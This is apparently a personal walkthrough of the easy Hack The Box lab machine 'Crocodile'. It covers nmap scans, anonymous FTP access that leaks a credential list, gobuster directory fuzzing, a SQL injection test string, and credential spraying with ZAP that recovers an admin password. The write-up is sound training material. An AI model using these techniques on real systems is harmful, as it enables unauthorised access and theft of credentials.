>[!tldr] Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable #FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. Enumerating and fuzzing the website will reveal a hidden login endpoint where the previously acquired credentials can be used to gain access to the admin panel.

# Adventure Mode
---

1. Starting off with a nmap scan
	1. `nmap 10.129.1.15 -p- -sT --stats-every=5s` 
	-> Ports: `21` and `80` 
	-> Services: `FTP` and `HTTP` (Respectively)
	2. `nmap 10.129.1.15 -p21,80 -sCV --stats-every=5s`
```shell
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:<ATTACKER_IP>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix
```
2. I first notice that anonymous login is allowed so im going to quickly try that before I check out the web page 
	- `ftp 10.129.1.15 -p 21` Login -> `anonymous:`null
```Shell
ftp> ls
227 Entering Passive Mode (10,129,1,15,164,34).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```
- Ok awesome, it seems that we have allowed user list and passwords. Im going to download them and maybe they can be used for a credential stuffing / password spraying attack.
3. Next i ran a pentest attack thourgh `ZAP` which didnt get me much. I decided to look around and noticed the web page is confined to just one page. The most iteractivity is the "Leave a Message" which might be vulnerable to SQLi attacks. When i run a request and capture a packet i get this URL: `http://10.129.1.15/assets/contact.php`
4. Now that i know the message is handled through `php` that can help me find more vulnerablilites. Along side my research i will then fuzz for more pages.
	1. `gobuster dir -k -u http://10.129.1.15/ -w Tools/SecLists-2026.1/Discovery/Web-Content/raft-small-directories.txt -x txt,php,html -t 40` -> 
```Shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
css                  (Status: 301) [Size: 308] [--> http://10.129.1.15/css/]
logout.php           (Status: 302) [Size: 0] [--> login.php]
login.php            (Status: 200) [Size: 1577]
config.php           (Status: 200) [Size: 0]
assets               (Status: 301) [Size: 311] [--> http://10.129.1.15/assets/]
js                   (Status: 301) [Size: 307] [--> http://10.129.1.15/js/]
index.html           (Status: 200) [Size: 58565]
fonts                (Status: 301) [Size: 310] [--> http://10.129.1.15/fonts/]
dashboard            (Status: 301) [Size: 314] [--> http://10.129.1.15/dashboard/]
server-status        (Status: 403) [Size: 276]
Progress: 80460 / 80460 (100.00%)
===============================================================
```
5. The thing that catches my eye is `login.php` from earlier we got user lists and passwords. so this page should allow me to fuzz the login. I will do that with `ZAP`. For the packet i captured i use `admin' or '1'='1` as the login and password, just to make sure theres no SQLi.
6. After fuzzing from `ZAP` i organzied by response bodies and the only one different was `admin:rKXM59ESxesUFHAd`. So then i manually tried this login and it worked. Im assuming we now have admin! The webpage after that has the flag
	- Flag -> `[REDACTED_FLAG]`